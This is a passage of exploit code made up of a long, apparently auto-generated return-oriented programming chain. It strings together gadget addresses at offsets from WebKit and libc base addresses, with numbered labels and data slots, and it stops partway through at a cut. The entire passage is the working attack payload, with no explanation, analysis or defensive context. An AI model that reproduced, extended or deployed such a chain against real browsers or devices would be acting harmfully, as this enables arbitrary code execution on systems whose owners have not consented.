webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+107456, //L1090-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+107544, //L1092-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+107600, //L1095-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1095:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+107680, //L1096-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1096:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1097:
db([21, 0]); // 0x15
set_gadget(libc_base+757614,); //pop rcx
//L1098:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+107784, //L1099-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+107800, //L1100-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+107888, //L1101-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+107944, //L1104-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1104:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+108016, //L1105-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+108072, //L1108-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1108:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+108176, //L1111-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1109:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L1111:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+108280, //L1114-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+108264, //L1113-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1113:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1114:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+108424, //L1117-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+108392, //L1115-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+108408, //L1116-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+108496, //L1118-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+108552, //L1121-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1121:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+108632, //L1122-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1122:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1123:
db([5, 0]); // 0x5
set_gadget(libc_base+757614,); //pop rcx
//L1124:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+108736, //L1125-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+108752, //L1126-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+108840, //L1127-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+108896, //L1130-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1130:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+109016, //L1133-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1131:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+109120, //L1136-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+109104, //L1135-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1135:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+109264, //L1139-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+109232, //L1137-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+109248, //L1138-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+109336, //L1140-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1140:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+109392, //L1143-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1143:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+109472, //L1144-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1144:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1145:
db([22, 0]); // 0x16
set_gadget(libc_base+757614,); //pop rcx
//L1146:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+109576, //L1147-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+109592, //L1148-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+109680, //L1149-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+109736, //L1152-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1152:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+109808, //L1153-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+109864, //L1156-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1156:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1157:
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+110016, //L1160-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1158:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1160:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+110120, //L1163-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+110104, //L1162-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1162:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1163:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+110264, //L1166-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+110232, //L1164-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+110248, //L1165-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+110336, //L1167-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+110392, //L1170-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1170:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+110472, //L1171-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1171:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1172:
db([23, 0]); // 0x17
set_gadget(libc_base+757614,); //pop rcx
//L1173:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+110576, //L1174-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+110592, //L1175-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+110680, //L1176-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+110736, //L1179-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1179:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+110808, //L1180-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+110864, //L1183-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1183:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1184:
libc_base+155394, //pop rdi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+111016, //L1187-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1185:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+111120, //L1190-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+111104, //L1189-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1189:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+111264, //L1193-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+111232, //L1191-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+111248, //L1192-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+111336, //L1194-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1194:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+111392, //L1197-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1197:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+111472, //L1198-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1198:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1199:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1200:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+111576, //L1201-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+111592, //L1202-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+111680, //L1203-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1203:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+111736, //L1206-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1206:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+111808, //L1207-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+111864, //L1210-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1210:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+111968, //L1213-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1211:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L1213:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+112072, //L1216-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+112056, //L1215-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1215:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1216:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+112216, //L1219-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+112184, //L1217-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+112200, //L1218-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+112288, //L1220-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+112344, //L1223-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1223:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+112424, //L1224-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1224:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1225:
db([9, 0]); // 0x9
set_gadget(libc_base+757614,); //pop rcx
//L1226:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+112528, //L1227-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+112544, //L1228-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+112632, //L1229-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1229:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+112688, //L1232-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1232:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+112808, //L1235-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1233:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1235:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+112912, //L1238-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+112896, //L1237-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1237:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+113056, //L1241-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+113024, //L1239-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+113040, //L1240-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+113128, //L1242-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+113184, //L1245-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1245:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+113264, //L1246-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1246:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1247:
